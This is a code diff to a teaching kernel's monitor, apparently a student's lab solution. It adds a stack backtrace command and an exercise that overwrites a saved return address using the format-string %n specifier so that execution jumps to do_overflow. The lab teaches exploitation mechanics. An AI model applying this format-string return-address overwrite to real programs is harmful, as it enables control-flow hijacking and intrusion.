@@ -25,6 +25,7 @@ struct Command {
 static struct Command commands[] = {
 	{ "help", "Display this list of commands", mon_help },
 	{ "kerninfo", "Display information about the kernel", mon_kerninfo },
+  { "stackbt", "Display the stack backtrace", mon_backtrace },
 };
 #define NCOMMANDS (sizeof(commands)/sizeof(commands[0]))
 
@@ -57,10 +58,92 @@ mon_kerninfo(int argc, char **argv, struct Trapframe *tf)
 	return 0;
 }
 
+// Lab1 only
+// read the pointer to the retaddr on the stack
+static uint32_t
+read_pretaddr() {
+    uint32_t pretaddr;
+    __asm __volatile("leal 4(%%ebp), %0" : "=r" (pretaddr)); 
+    return pretaddr;
+}
+
+void
+do_overflow(void)
+{
+    cprintf("Overflow success\n");
+}
+
+void
+start_overflow(void)
+{
+	// You should use a techique similar to buffer overflow
+	// to invoke the do_overflow function and
+	// the procedure must return normally.
+
+    // And you must use the "cprintf" function with %n specifier
+    // you augmented in the "Exercise 9" to do this job.
+
+    // hint: You can use the read_pretaddr function to retrieve 
+    //       the pointer to the function call return address;
+
+    char str[256] = {};
+    int nstr = 0;
+    char *pret_addr;
+    cprintf("%p",do_overflow); // I use this to get the function address
+    /*0xf0100750*/
+    pret_addr=(char *)read_pretaddr();
+    *(uint32_t *)(pret_addr+4)=*(uint32_t *)pret_addr;
+    cprintf("12345678901234567890123456789012345678901234567890123456789012345678901234567890%n",pret_addr);//50
+    cprintf("1234567%n",pret_addr+1);//07
+    cprintf("1234567890123456%n",pret_addr+2);//10
+    cprintf("123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890%n",pret_addr+3);//f0
+    /*cprintf("%p",(void *)*(uint32_t *)pret_addr);*/
+
+	// Your code here.
+    
+
+
+}
+
+void
+overflow_me(void)
+{
+        start_overflow();
+}
+
 int
 mon_backtrace(int argc, char **argv, struct Trapframe *tf)
 {
 	// Your code here.
+  cprintf("Stack backtrace:\n");
+  uint32_t *current_ebp=(uint32_t*)read_ebp();
+  struct Eipdebuginfo eipdbg;
+  int i;
+  while (current_ebp) {
+    cprintf("  ebp %08x  eip %08x  args %08x %08x %08x %08x %08x\n",
+        (uint32_t)current_ebp,
+        (uint32_t)*(current_ebp+1),
+        (uint32_t)*(current_ebp+2),
+        (uint32_t)*(current_ebp+3),
+        (uint32_t)*(current_ebp+4),
+        (uint32_t)*(current_ebp+5),
+        (uint32_t)*(current_ebp+6)
+        );
+    debuginfo_eip((uintptr_t)*(current_ebp+1),&eipdbg);
+    
+    cprintf("         %s:%d: ",
+        eipdbg.eip_file,
+        eipdbg.eip_line
+        );
+    for (i=0;i<eipdbg.eip_fn_namelen;++i) //I have no idea to do this elegantly
+      cprintf("%c",*(eipdbg.eip_fn_name+i));
+    cprintf("+%d\n",
+        (uintptr_t)*(current_ebp+1)-eipdbg.eip_fn_addr
+        );
+    current_ebp=(uint32_t*)*current_ebp;
+  }
+    /*overflow_me();*/
+    cprintf("Backtrace success\n");
 	return 0;
 }
 
